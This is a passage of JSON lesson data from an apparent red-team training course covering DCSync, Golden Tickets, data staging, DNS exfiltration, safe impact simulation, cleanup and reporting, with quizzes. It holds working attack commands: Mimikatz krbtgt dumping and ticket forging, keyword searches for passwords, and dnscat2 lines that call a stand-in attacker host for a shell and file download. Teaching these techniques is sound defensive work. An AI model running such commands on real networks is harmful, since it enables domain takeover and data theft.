                        "content": "<p>A <strong>Domain Controller (DC)</strong> is the server that runs Active Directory Domain Services. It holds the `NTDS.dit` database, which contains the NTLM hashes for every user and computer account in the domain. Gaining administrative access to a DC is the 'game over' scenario for an enterprise network.</p>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "The DCSync Attack",
                        "content": "<p>Domain Controllers need to replicate their data with each other to stay in sync. The <strong>DCSync</strong> attack abuses this legitimate replication functionality. An attacker who has compromised an account with the necessary replication privileges can use a tool like Mimikatz to *pretend* to be a Domain Controller and ask another DC to replicate its data.</p><p>The target DC will happily oblige and send the attacker the NTLM hash for any user they request, including Domain Admins and the highly sensitive KRBTGT account. This attack is extremely stealthy because it uses the standard, legitimate Directory Replication Service (DRS) remote protocol. To a defender, the traffic looks like normal DC-to-DC replication.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "The KRBTGT Account",
                        "content": "<p>The most important account in Active Directory is the <strong>KRBTGT</strong> account. This is a special, disabled service account whose password hash is used as the master key to encrypt all Kerberos tickets in the domain.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Golden Key</strong></div><p>Stealing the NTLM hash of the KRBTGT account is the ultimate goal of a DCSync attack. An attacker who possesses this hash can create their own forged Kerberos tickets for any user, with any level of privilege, and with an almost unlimited lifetime. This is the foundation of the 'Golden Ticket' attack, which provides the attacker with perpetual Domain Admin access.</p></div>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "mimikatz.exe \"lsadump::dcsync /user:DOMAIN\\krbtgt\" \"exit\"",
                    "language": "batch",
                    "code": ":: This Mimikatz command executes a DCSync attack.\n:: The operator must be running this from a context (e.g., a beacon)\n:: that has the necessary domain replication rights.\n\n:: lsadump::dcsync : The Mimikatz module for the DCSync attack.\n:: /user:DOMAIN\\krbtgt : The specific user account to get the hash for. \n::                      In this case, we are targeting the master KRBTGT account.\n\n:: --- Sample Output ---\n:: [DCSync] 'krbtgt' account\n:: Hash NTLM: 8a73492a725224523b105f639c391082  <-- This is the Golden Ticket key!\n\n:: An attacker can also dump the hash for any other user, like a Domain Admin:\n:: lsadump::dcsync /user:CORPNET\\dadmin"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the 'game over' objective for an attacker in most Active Directory networks?",
                        "options": [
                            "Compromising a user's workstation.",
                            "Gaining administrative access to a Domain Controller.",
                            "Gaining access to a file server.",
                            "Getting a list of all users."
                        ],
                        "correct": 1,
                        "explanation": "A Domain Controller holds the credentials for every account in the domain. Compromising it gives the attacker total control."
                    },
                    {
                        "id": 2,
                        "question": "How does a DCSync attack work?",
                        "options": [
                            "It exploits a software vulnerability on the Domain Controller.",
                            "It abuses the legitimate domain replication process to request password hashes from a Domain Controller.",
                            "It is a password guessing attack.",
                            "It is a type of phishing attack."
                        ],
                        "correct": 1,
                        "explanation": "DCSync is powerful because it's stealthy. It uses the built-in Directory Replication Service protocol, so the network traffic looks like normal, legitimate replication activity between two Domain Controllers."
                    },
                    {
                        "id": 3,
                        "question": "What is the KRBTGT account's hash used for?",
                        "options": [
                            "It is the password for the main administrator.",
                            "It is not an important account.",
                            "It is the master key used to encrypt and sign all Kerberos tickets in the domain.",
                            "It is used to log into the firewall."
                        ],
                        "correct": 2,
                        "explanation": "The KRBTGT hash is the most valuable secret in Active Directory. Possessing it allows an attacker to forge Kerberos tickets and become a Domain Admin indefinitely."
                    }
                ]
            }
        },
        {
            "id": "lesson-21",
            "title": "Advanced AD Attacks: Golden Tickets",
            "duration": "75 min",
            "objectives": [
                "Understand the concept of a Golden Ticket attack",
                "Learn how the KRBTGT hash is used to forge Kerberos tickets",
                "Explore how to create and use a Golden Ticket with Mimikatz",
                "Analyze the persistence and access provided by a Golden Ticket",
                "Discuss the remediation required after a KRBTGT compromise"
            ],
            "content": {
                "overview": "A Golden Ticket is the ultimate persistence mechanism in Active Directory. By using the stolen KRBTGT hash, an attacker can forge their own Kerberos tickets, granting them god-like access to any resource in the domain, whenever they want, for as long as they want. This lesson covers the creation and use of this powerful post-exploitation artifact.",
                "sections": [
                    {
                        "title": "Forging Kerberos Tickets",
                        "content": "<p>A Kerberos Ticket Granting Ticket (TGT) is like a master key for a user's session. It is issued by the Domain Controller and encrypted with the KRBTGT hash. A <strong>Golden Ticket</strong> is a forged TGT that an attacker creates themselves using the stolen KRBTGT hash.</p><p>Because the attacker has the master key, they can create a ticket for *any user* (real or fake), with *any privileges* (like Domain Admin), and with a very long expiration date (e.g., 10 years). When this forged ticket is presented to any service in the domain, the service will trust it because it was correctly signed by the KRBTGT key.</p>",
                        "image": "https://i.imgur.com/u7nL6Xk.png"
                    },
                    {
                        "title": "Creating and Using a Golden Ticket",
                        "content": "<p>The tool of choice for creating Golden Tickets is <strong>Mimikatz</strong>. The attacker needs several pieces of information that they would have gathered during enumeration:</p><ul><li>The domain name.</li><li>The domain's SID (Security Identifier).</li><li>The stolen KRBTGT hash.</li><li>A username to impersonate (e.g., 'Administrator').</li></ul><p>They feed this information into Mimikatz, which generates the ticket and automatically injects it into the attacker's current logon session. From that point on, the attacker is, for all intents and purposes, a Domain Admin and can access any computer or resource in the domain without needing a password.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Remediation",
                        "content": "<p>A Golden Ticket attack is an enterprise-ending compromise. The only way to invalidate all existing Golden Tickets is to change the KRBTGT password.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Double Tap</strong></div><p>Changing the KRBTGT password is a highly sensitive operation and must be done *twice*. This is because Active Directory keeps the current and previous KRBTGT password to avoid replication issues. An attacker could still use a Golden Ticket signed with the previous key. Only by changing the password twice in a row can an organization ensure that all Golden Tickets are invalidated. This is often part of a full Active Directory forest recovery process.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "mimikatz.exe \"kerberos::golden ... /ptt\" \"exit\"",
                    "language": "batch",
                    "code": ":: This Mimikatz command creates and injects a Golden Ticket.\n\n:: The attacker must provide the necessary information:\nset USER=Administrator\nset DOMAIN=corp.local\nset SID=S-1-5-21-1234567890-1234567890-1234567890\nset KRBTGT_HASH=8a73492a725224523b105f639c391082\n\n:: The command:\n:: kerberos::golden : The module to create a golden ticket.\n:: /user, /domain, /sid, /krbtgt : The required parameters.\n:: /ptt : This stands for 'Pass-the-Ticket'. It tells Mimikatz to inject the\n::        newly created ticket directly into the current session's memory.\n\nmimikatz.exe \"kerberos::golden /user:%USER% /domain:%DOMAIN% /sid:%SID% /krbtgt:%KRBTGT_HASH% /ptt\" \"exit\"\n\n:: After this command, the attacker can simply access any resource as the Administrator.\n:: For example:\ndir \\\\DC01\\C$"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is a Golden Ticket?",
                        "options": [
                            "A legitimate Kerberos ticket.",
                            "A forged Kerberos Ticket Granting Ticket (TGT) created by an attacker using the stolen KRBTGT hash.",
                            "An NTLM hash.",
                            "A user's password."
                        ],
                        "correct": 1,
                        "explanation": "A Golden Ticket is the ultimate persistence artifact. Because it is signed with the domain's master key, it is trusted by every service in the domain and can grant the attacker any permission they desire."
                    },
                    {
                        "id": 2,
                        "question": "What is the most critical piece of information an attacker needs to create a Golden Ticket?",
                        "options": [
                            "A standard user's password.",
                            "The domain name.",
                            "The NTLM hash of the KRBTGT account.",
                            "The IP address of a Domain Controller."
                        ],
                        "correct": 2,
                        "explanation": "The KRBTGT hash is the secret key that underpins all of Kerberos security. Possessing it is equivalent to possessing the master key to the entire domain."
                    },
                    {
                        "id": 3,
                        "question": "What is the only way to invalidate all existing and future Golden Tickets after a compromise?",
                        "options": [
                            "To reboot the Domain Controller.",
                            "To change all user passwords.",
                            "To change the KRBTGT password twice.",
                            "To block the attacker's IP address."
                        ],
                        "correct": 2,
                        "explanation": "Changing the KRBTGT password effectively changes the master key of the domain. This is the only way to ensure that any tickets signed with the old, compromised key are no longer valid. It must be done twice to clear AD's password history."
                    }
                ]
            }
        },
        {
            "id": "lesson-22",
            "title": "Collection and Staging of Data",
            "duration": "60 min",
            "objectives": [
                "Understand the 'Collection' phase of an attack",
                "Learn how to identify and gather sensitive data based on objectives",
                "Explore techniques for staging data on an internal server",
                "Analyze how to archive and compress data for exfiltration",
                "Practice searching for sensitive files on a network share"
            ],
            "content": {
                "overview": "Once an attacker has control of the network, their final phase is to achieve their objective. For many adversaries, this means stealing sensitive data. This lesson covers the 'Collection' tactic, where the attacker identifies, gathers, and prepares the target data for exfiltration.",
                "sections": [
                    {
                        "title": "Identifying and Collecting 'Crown Jewels'",
                        "content": "<p>Based on the engagement's objectives, the red team operator will now search for the 'crown jewels'. This involves using the privileged access they have gained to search through file servers, databases, and user workstations for the target data.</p><h3>Searching for Data:</h3><p>Attackers can use built-in tools to search for files based on keywords, file types, or last modified dates. They can search for:<ul><li>Documents containing words like 'password', 'secret', 'confidential', or 'M&A'.</li><li>Spreadsheets in the finance department's file share.</li><li>Source code repositories for proprietary software.</li><li>Configuration files that might contain plaintext credentials for other systems.</li></ul></p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Staging Data for Exfiltration",
                        "content": "<p>An attacker will rarely exfiltrate data directly from many different machines. This would be noisy and hard to manage. Instead, they will first <strong>stage</strong> the data.</p><p>Staging involves collecting all the target data from various sources and consolidating it onto a single, compromised internal server. The attacker will then archive and compress this data into a single file (e.g., a password-protected ZIP file). This makes the final exfiltration step much faster and stealthier, as they only need to move a single, encrypted file out of the network.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "findstr /S /I \"password\" *.txt *.xls",
                        "language": "batch",
                        "code": ":: The 'findstr' command on Windows is used to search for strings in files.\n\n:: /S : Search for files in the current directory and all subdirectories.\n:: /I : Perform a case-insensitive search.\n:: \"password\" : The keyword to search for.\n:: *.txt *.xls : The file types to search within.\n\n:: Attacker runs this on a compromised file server to find interesting files.\ncd \\\\FILESERVER01\\shares\\Finance\nfindstr /S /I \"confidential\" *.docx > C:\\temp\\interesting_files.txt\n\n:: After identifying the files, the attacker would copy them to their staging server.\nxcopy C:\\...\\* \\\\STAGING-SERVER\\loot\\"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the 'Collection' tactic in the MITRE ATT&CK framework?",
                        "options": [
                            "Gaining initial access.",
                            "The process of identifying and gathering data relevant to the attacker's objectives.",
                            "Escalating privileges.",
                            "Establishing persistence."
                        ],
                        "correct": 1,
                        "explanation": "Collection is the phase where the attacker gathers the data they came to steal, before they attempt to exfiltrate it from the network."
                    },
                    {
                        "id": 2,
                        "question": "What does it mean to 'stage' data for exfiltration?",
                        "options": [
                            "To delete the data.",
                            "To exfiltrate the data directly from its original location.",
                            "To consolidate data from multiple sources onto a single internal server before exfiltration.",
                            "To encrypt the data in place."
                        ],
                        "correct": 2,
                        "explanation": "Staging is a common operational practice. It makes the final, noisy exfiltration step much cleaner and faster, as the attacker only has to move one single, compressed archive out of the network."
                    },
                    {
                        "id": 3,
                        "question": "Which of the following would be a typical action during the Collection phase?",
                        "options": [
                            "Sending a phishing email.",
                            "Running a vulnerability scanner.",
                            "Searching a compromised file server for documents containing sensitive keywords.",
                            "Creating a Golden Ticket."
                        ],
                        "correct": 2,
                        "explanation": "Once the attacker has privileged access, they will use that access to actively search for the data that is the ultimate objective of their campaign."
                    }
                ]
            }
        },
        {
            "id": "lesson-23",
            "title": "Data Exfiltration",
            "duration": "75 min",
            "objectives": [
                "Understand the 'Exfiltration' phase of an attack",
                "Learn about the use of covert channels to sneak data out",
                "Explore techniques like DNS tunneling and ICMP exfiltration",
                "Analyze how to hide data in normal HTTP/S traffic",
                "Practice exfiltrating a file over DNS using DNSCat2"
            ],
            "content": {
                "overview": "The final step for a data theft adversary is exfiltration: getting the stolen data out of the target network and back to their own infrastructure. This is a high-risk phase for the attacker, as large outbound data transfers can be easily detected. This lesson covers the stealthy techniques attackers use to exfiltrate data without being caught.",
                "sections": [
                    {
                        "title": "The Exfiltration Challenge",
                        "content": "<p>Getting data *out* of a network is often harder than getting in. Most organizations have strict firewall rules that block most outbound connections. A large outbound transfer of a multi-gigabyte ZIP file to a strange IP address would trigger an immediate alert.</p><p>To avoid this, attackers use <strong>covert channels</strong>. They hide their exfiltrated data inside protocols that are almost always allowed out of the network, like DNS and HTTP/S.</p>",
                        "image": "https://i.imgur.com/u7nL6Xk.png"
                    },
                    {
                        "title": "DNS Tunneling",
                        "content": "<p><strong>DNS tunneling</strong> is a very common and stealthy exfiltration technique. The attacker takes the stolen file, breaks it into small chunks, and encodes each chunk as a subdomain of a domain they control.</p><p>The compromised host then performs a DNS query for each of these long, encoded subdomains (e.g., `[chunk1].attacker.com`, `[chunk2].attacker.com`, ...). This traffic is sent to the corporate DNS server, which forwards it out to the internet. The attacker's authoritative DNS server receives these queries, extracts the encoded data from the subdomain, and reconstructs the original file. To a defender, this just looks like a large volume of strange-looking but legitimate DNS traffic.</p>",
                        "image": "https://images.unsplash.com/photo-1544383835-bda2bc66a22d?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Hiding Data in HTTP/S",
                        "content": "<p>Another common technique is to hide the data in normal-looking web traffic. The attacker can break the stolen file into chunks and send each chunk in an HTTP POST request to a server they control. To blend in, they can make the traffic look like a legitimate activity, such as uploading a series of images to a photo sharing website.</p>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "dnscat2 --dns server=your_c2_ip,port=53 --secret=12345",
                    "language": "bash",
                    "code": "# DNSCat2 is a popular open-source tool for creating an encrypted C2\n# or data exfiltration channel over the DNS protocol.\n\n# --- Attacker's Server ---\n# The attacker starts the dnscat2 server on their C2 machine.\n# It listens for incoming DNS queries.\nruby ./dnscat2.rb --dns \"host=c2.attacker.com,port=53\" --secret=12345\n\n# --- Victim's Machine ---\n# The attacker runs the dnscat2 client on the compromised host.\n# The client will connect back to the server, tunneling all traffic over DNS.\n./dnscat2 --dns server=c2.attacker.com,port=53 --secret=12345\n\n# Once the session is established, the attacker has a shell.\n# They can then use the 'download' command to exfiltrate a file.\n# dnscat2> download /path/to/loot.zip"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of the 'Exfiltration' tactic?",
                        "options": [
                            "To gain initial access.",
                            "To establish persistence.",
                            "To steal data by transferring it from the victim network to the attacker's infrastructure.",
                            "To escalate privileges."
                        ],
                        "correct": 2,
                        "explanation": "Exfiltration is the final 'Actions on Objectives' step for a data theft adversary. It is the process of actually getting the stolen data out of the target environment."
                    },
                    {
                        "id": 2,
                        "question": "What is 'DNS tunneling'?",
                        "options": [
                            "A method for making DNS faster.",
                            "A technique for hiding data in a series of DNS queries to exfiltrate it from a network.",
                            "A type of VPN.",
                            "A way to block DNS traffic."
                        ],
                        "correct": 1,
                        "explanation": "DNS tunneling is a classic covert channel. Because DNS traffic is almost always permitted outbound, it provides a reliable, though slow, method for bypassing firewalls and exfiltrating data."
                    },
                    {
                        "id": 3,
                        "question": "Why do attackers use covert channels for exfiltration?",
                        "options": [
                            "Because they are faster than a normal connection.",
                            "To avoid detection, by hiding their malicious data inside of legitimate-looking traffic that is likely to be allowed by firewalls.",
                            "Because they are easier to use.",
                            "Because they are required by their C2 framework."
                        ],
                        "correct": 1,
                        "explanation": "A large, direct transfer to an unknown IP is a huge red flag. Covert channels are all about stealth and blending in to avoid tripping these obvious detection thresholds."
                    }
                ]
            }
        },
        {
            "id": "lesson-24",
            "title": "Simulating Impact",
            "duration": "60 min",
            "objectives": [
                "Understand the importance of safely demonstrating impact",
                "Learn how to simulate a ransomware attack without causing damage",
                "Explore techniques for creating harmless proof-of-concept files",
                "Analyze the role of impact simulation in communicating risk",
                "Practice writing a proof-of-concept ransom note"
            ],
            "content": {
                "overview": "A red team's job is not just to achieve an objective, but to demonstrate the business risk of their findings. This lesson covers the final step of the active engagement: safely and professionally simulating the impact of an attack, such as ransomware, in a way that clearly communicates the risk to leadership without causing any actual harm.",
                "sections": [
                    {
                        "title": "Safely Demonstrating Impact",
                        "content": "<p>It is strictly forbidden for a red team to cause any actual damage or disruption. However, to get buy-in from leadership, they must demonstrate the *potential* for damage. This is a delicate balancing act.</p><p>Instead of encrypting the entire finance share with real ransomware, an operator will create a harmless proof-of-concept. The goal is to create an undeniable piece of evidence that proves they had the access and capability to achieve their objective.</p>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Simulating Ransomware",
                        "content": "<p>To simulate a ransomware attack, an operator might:</p><ol><li>Navigate to a critical file share on the Domain Controller.</li><li>Create a new folder called 'REDTEAM_PROOF_OF_CONCEPT'.</li><li>Inside that folder, create a text file named `RANSOM_NOTE.txt` that explains what they have achieved.</li><li>Take a screenshot of their desktop, showing their command prompt with `whoami` displaying 'nt authority\\system' on the Domain Controller, with the file explorer open to the critical share in the background.</li></ol><p>This screenshot is the 'trophy' that proves they achieved their objective. It is harmless, but it powerfully communicates the risk to a non-technical executive.</p>",
                        "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Simulate_Ransomware_Encryption_PoC.ps1",
                        "language": "powershell",
                        "code": "# This is a SAFE script to simulate ransomware impact.\n# It does NOT encrypt any real files.\n\n# Target directory (e.g., a Domain Controller's desktop)\n$TargetDir = \"C:\\Users\\Administrator\\Desktop\\\"\n\n# Create a proof-of-concept file\n$PocFile = Join-Path $TargetDir \"REDTEAM_POC.txt\"\nSet-Content -Path $PocFile -Value \"This is a proof of concept file. If this were a real attack, this file and all others on this server would be encrypted.\"\n\n# Create a fake 'ransom note'\n$RansomNote = Join-Path $TargetDir \"HOW_TO_GET_YOUR_FILES_BACK.txt\"\n$NoteContent = @\"\nYour network has been compromised by the Red Team.\nWe have achieved Domain Administrator privileges.\nWe can read, modify, and encrypt all data on your network.\nThis is a test. Please contact the security team to review the findings.\n\"@\nSet-Content -Path $RansomNote -Value $NoteContent\n\nWrite-Host \"Proof of concept files created on the desktop.\""
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of the 'Simulating Impact' phase of a red team engagement?",
                        "options": [
                            "To cause as much damage as possible.",
                            "To safely and professionally demonstrate the potential business impact of the vulnerabilities they have found.",
                            "To end the engagement.",
                            "To test the company's backup and recovery process."
                        ],
                        "correct": 1,
                        "explanation": "This is a critical communication step. The goal is to create a compelling, undeniable piece of evidence that helps leadership understand the real-world risk, without causing any actual harm to the organization."
                    },
                    {
                        "id": 2,
                        "question": "Which of the following is a safe way to simulate a ransomware attack?",
                        "options": [
                            "Deploying real ransomware on a single server.",
                            "Encrypting the entire file share of the finance department.",
                            "Creating a harmless text file named 'RANSOM_NOTE.txt' on a critical server's desktop.",
                            "Deleting a small number of non-critical files."
                        ],
                        "correct": 2,
                        "explanation": "This is a standard and safe procedure. It proves the attacker had the access to cause damage, without actually causing any. Taking a screenshot of this is the classic 'trophy' of a red team engagement."
                    },
                    {
                        "id": 3,
                        "question": "Why is it important to have a clear, harmless proof-of-concept?",
                        "options": [
                            "It is not important.",
                            "It is a powerful tool for communicating risk to non-technical stakeholders, like executives.",
                            "It is required by the C2 framework.",
                            "It is the only way to test the blue team's response."
                        ],
                        "correct": 1,
                        "explanation": "A screenshot of a command prompt on a Domain Controller is something that a CEO can immediately understand and is much more impactful than a 100-page technical report. It makes the risk tangible."
                    }
                ]
            }
        },
        {
            "id": "lesson-25",
            "title": "Evidence Collection and Cleanup",
            "duration": "60 min",
            "objectives": [
                "Understand the importance of documenting every action during an engagement",
                "Learn how to safely remove tools, payloads, and persistence from a network",
                "Analyze the process of reverting any changes made to the environment",
                "Discuss the role of logging and evidence for the final report",
                "Practice documenting an attack path and planning a cleanup"
            ],
            "content": {
                "overview": "A professional adversary simulation is not over until the target environment is returned to its original state. This lesson covers the crucial final phases of the operation: meticulously documenting all actions, and carefully cleaning up all tools, payloads, and persistence mechanisms to leave no trace.",
                "sections": [
                    {
                        "title": "Evidence Collection and Documentation",
                        "content": "<p>Throughout the entire engagement, a red team operator must keep a detailed log of every single command they run, every tool they use, and every host they touch. This is not just for the final report; it's a critical part of a safe and professional operation.</p><h3>The Operator's Log:</h3><ul><li><strong>Timestamps:</strong> When was each action taken?</li><li><strong>Source and Destination:</strong> From which host did I run the command, and what host did I target?</li><li><strong>Command:</strong> The exact command that was executed.</li><li><strong>Output:</strong> The result of the command.</li><li><strong>Screenshots:</strong> Taking screenshots of key moments (like getting a SYSTEM shell) is essential for the final report.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Cleanup",
                        "content": "<p>Once the engagement is over, the red team must meticulously remove all of their artifacts from the target environment. The goal is to return the network to the exact state it was in before the test began.</p><h3>Cleanup Checklist:</h3><ul><li><strong>Remove Persistence:</strong> Delete any scheduled tasks, services, or registry keys that were created.</li><li><strong>Delete Tools and Payloads:</strong> Securely delete any files that were uploaded to the target hosts.</li><li><strong>Revert Changes:</strong> Undo any configuration changes that were made (e.g., changing a registry key to enable an exploit).</li><li><strong>Terminate Beacons:</strong> Kill all active C2 beacons.</li></ul><p>A thorough cleanup is the hallmark of a professional red team. Leaving behind tools or persistence could inadvertently create a real vulnerability in the client's network.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Remove_Persistence_Scheduled_Task.bat",
                    "language": "batch",
                    "code": ":: This is a cleanup script that the red team would run.\n:: It reverses the persistence mechanism created in Lesson 19.\n\n:: The command to delete the scheduled task.\n:: /tn \"Updater\" : The name of the task to be deleted.\n:: /f : Force the deletion without a confirmation prompt.\nschtasks /delete /tn \"Updater\" /f\n\n:: The operator would have a similar command to delete their service,\n:: remove their registry key, and securely delete their payload from disk.\nreg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoor\" /f\ndel C:\\payload.exe"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Why is it critical for a red team operator to keep a detailed log of all their actions?",
                        "options": [
                            "It is not important.",
                            "For the final report and to ensure that all actions can be tracked and all changes can be reverted during cleanup.",
                            "To show off to other hackers.",
                            "To get paid."
                        ],
                        "correct": 1,
                        "explanation": "Meticulous logging is a core tenet of professional, ethical hacking. It is essential for writing a detailed and actionable report, and it is absolutely critical for ensuring a safe and complete cleanup of the target environment."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary goal of the 'Cleanup' phase?",
                        "options": [
                            "To delete the target's log files.",
                            "To return the target environment to its original state by removing all of the red team's tools, payloads, and persistence.",
                            "To write the final report.",
                            "To start a new engagement."
                        ],
                        "correct": 1,
                        "explanation": "A professional red team must 'leave no trace'. The cleanup phase is a critical part of ensuring that the engagement does not introduce any new, real vulnerabilities into the client's network."
                    },
                    {
                        "id": 3,
                        "question": "Which of the following is a key task during the cleanup phase?",
                        "options": [
                            "Sending a final phishing email.",
                            "Running a vulnerability scan.",
                            "Removing any persistence mechanisms that were created.",
                            "Dumping credentials from LSASS."
                        ],
                        "correct": 2,
                        "explanation": "Removing persistence is one of the most important cleanup steps. Forgetting to remove a scheduled task or a service could leave a backdoor on the client's system, which is a major ethical and professional failure."
                    }
                ]
            }
        },
        {
            "id": "lesson-26",
            "title": "Effective Reporting and Debriefing",
            "duration": "75 min",
            "objectives": [
                "Understand the structure of a professional red team report",
                "Learn how to translate technical findings into business risk",
                "Practice writing a compelling executive summary",
                "Explore the components of a detailed technical narrative",
                "Discuss how to effectively debrief stakeholders"
            ],
            "content": {
                "overview": "The final product of a red team engagement is not a shell on the Domain Controller; it's the report. This lesson covers the art of creating a high-impact report that clearly communicates the findings, translates technical details into business risk, and provides actionable recommendations that will actually improve the organization's security posture.",
                "sections": [
                    {
                        "title": "The Executive Summary",
                        "content": "<p>The <strong>executive summary</strong> is the most important part of the entire report. It is a one-page, high-level summary written for a non-technical audience, like the CEO and the board. It should avoid jargon and focus on business impact.</p><h3>Key Components:</h3><ul><li><strong>Objectives:</strong> A clear statement of the engagement's goals.</li><li><strong>Outcome:</strong> A clear statement of whether the objectives were achieved. (e.g., 'The red team successfully achieved the objective of gaining Domain Administrator privileges.').</li><li><strong>Business Impact:</strong> An explanation of what this means in business terms. (e.g., 'This level of access would allow a real attacker to steal all customer data and deploy ransomware across the entire enterprise.').</li><li><strong>Key Recommendations:</strong> A few high-level strategic recommendations.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "The Technical Narrative",
                        "content": "<p>The <strong>technical narrative</strong> is the detailed, chronological story of the attack. It is written for the technical audience (the Blue Team and IT staff). It should be a step-by-step account of the entire attack path, from initial access to objective completion.</p><p>This section should be detailed enough that the Blue Team can use it to understand exactly what happened, find the root causes, and build new detection rules. It should include the operator's logs and screenshots as evidence.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Actionable Recommendations",
                        "content": "<p>A good report doesn't just list problems; it provides solutions. Each finding should be accompanied by a clear, actionable recommendation.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Strategic and Tactical</strong></div><p>Recommendations should be both tactical (e.g., 'Patch vulnerability CVE-2023-1234 on these five servers') and strategic (e.g., 'Implement a more robust privilege access management solution to reduce the number of local administrators'). They should be prioritized based on risk and effort.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Red_Team_Report_Template.docx",
                    "language": "markdown",
                    "code": "# Red Team Report Template\n\n**1. Executive Summary**\n   - 1.1. Engagement Objectives\n   - 1.2. Summary of Results\n   - 1.3. Business Impact Analysis\n   - 1.4. Strategic Recommendations\n\n**2. Technical Narrative**\n   - 2.1. Attack Path Overview (Diagram)\n   - 2.2. Phase 1: Initial Access (Phishing)\n   - 2.3. Phase 2: Host-Based Reconnaissance\n   - 2.4. Phase 3: Privilege Escalation (Unquoted Service Path)\n   - 2.5. Phase 4: Credential Dumping (Mimikatz)\n   - 2.6. Phase 5: Lateral Movement (Pass-the-Hash)\n   - 2.7. Phase 6: Domain Dominance (DCSync)\n   - 2.8. Phase 7: Objective Completion\n\n**3. Findings and Recommendations**\n   - 3.1. (Critical) Ineffective EDR Monitoring for PowerShell\n      - Recommendation: ...\n   - 3.2. (High) Lack of Network Segmentation\n      - Recommendation: ...\n   - 3.3. (Medium) Weak Password Policy for Service Accounts\n      - Recommendation: ...\n\n**4. Appendix**\n   - 4.1. Detailed Operator Logs\n   - 4.2. Scope and RoE"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Who is the primary audience for the Executive Summary of a red team report?",
                        "options": [
                            "The red team operator.",
                            "The blue team analysts.",
                            "Non-technical stakeholders, like the CEO and other executives.",
                            "The company's customers."
                        ],
                        "correct": 2,
                        "explanation": "The Executive Summary is arguably the most important page. It must be written in clear, business-focused language to communicate the risk and justify the investment in remediation."
                    },
                    {
                        "id": 2,
                        "question": "What is the purpose of the Technical Narrative?",
                        "options": [
                            "To be a high-level summary.",
                            "To provide a detailed, step-by-step account of the attack chain for the technical defenders (Blue Team).",
                            "To list the budget for the engagement.",
                            "To be a legal document."
                        ],
                        "correct": 1,
                        "explanation": "The narrative is the story of the attack. It's crucial for the blue team to understand the exact TTPs the red team used so they can build detections and close the identified gaps."
                    },
                    {
                        "id": 3,
                        "question": "What is a key characteristic of a good recommendation in a red team report?",
                        "options": [
                            "It should be as vague as possible.",
                            "It should be actionable and prioritized.",
                            "It should only focus on tactical issues.",
                            "It should blame a specific person."
                        ],
                        "correct": 1,
                        "explanation": "A good report provides solutions, not just problems. The recommendations should be clear, concrete, and prioritized so the organization knows exactly what to do next to improve their security posture."
                    }
                ]
            }
        },
        {
            "id": "lesson-27",
            "title": "Advanced Evasion: Bypassing EDRs",
            "duration": "75 min",
            "objectives": [
                "Understand the function of Endpoint Detection & Response (EDR) solutions",
                "Learn about API hooking and how to bypass it with direct system calls",
                "Explore the 'Bring Your Own Vulnerable Driver' (BYOVD) technique",
                "Analyze the role of C2 customization in evading EDR telemetry"
            ],
            "content": {
                "overview": "Modern endpoint security has moved beyond simple antivirus to Endpoint Detection & Response (EDR). These are powerful tools that monitor the behavior of a system in real-time. This lesson covers the advanced techniques that attackers use to evade and bypass these sophisticated defenses.",
                "sections": [
                    {
                        "title": "Understanding EDRs",
